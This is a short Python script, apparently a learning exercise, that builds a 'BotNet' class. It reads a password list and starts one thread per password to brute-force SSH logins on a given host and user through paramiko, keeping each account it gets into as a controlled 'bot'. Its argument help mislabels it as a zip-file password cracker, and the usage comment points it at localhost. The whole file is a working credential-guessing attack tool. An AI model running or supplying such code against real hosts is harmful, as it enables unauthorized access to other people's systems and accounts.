import argparse
from threading import Thread

import paramiko

from bot import Bot


class BotNet:
    def __init__(self, host: str = '', user: str = '', pwd_src_path: str = ''):
        self.__bots: list[Bot] = []

        self.host = host
        self.user = user
        self.pwd_src_path = pwd_src_path

        if not self.host or not self.user or not self.pwd_src_path:
            self.__get_args()


    def __get_args(self):
        parser = argparse.ArgumentParser(description='Zip file password cracker')
        parser.add_argument('-H', dest='host', type=str, help='Target host', required=True)
        parser.add_argument('-u', dest='user', type=str, help='Target user', required=True)
        parser.add_argument('-F', dest='pwd_src_path', type=str, help='Passwords source path', required=True)
        args = parser.parse_args()

        self.host = args.host
        self.user = args.user
        self.pwd_src_path = args.pwd_src_path


    def __get_passwords(self):
        with open(self.pwd_src_path) as passwords_file:
            for password in passwords_file:
                password = password.strip()
                yield password


    def __try_connect(self, password: str):
        bot = Bot(self.host, self.user, password)

        try:
            bot.connect()
            self.__bots.append(bot)
        except:
            pass


    def disconnect_all(self):
        for bot in self.__bots:
            bot.disconnect()


    def run(self):
        threads = []
        for password in self.__get_passwords():
            thread = Thread(target=self.__try_connect, args=(password,))
            thread.start()
            threads.append(thread)

        [t.join() for t in threads]


# with open(passwords_file) as f:

botnet = BotNet()
botnet.run()
# python3 main.py -H localhost -u eoisaac -F senhas.txt

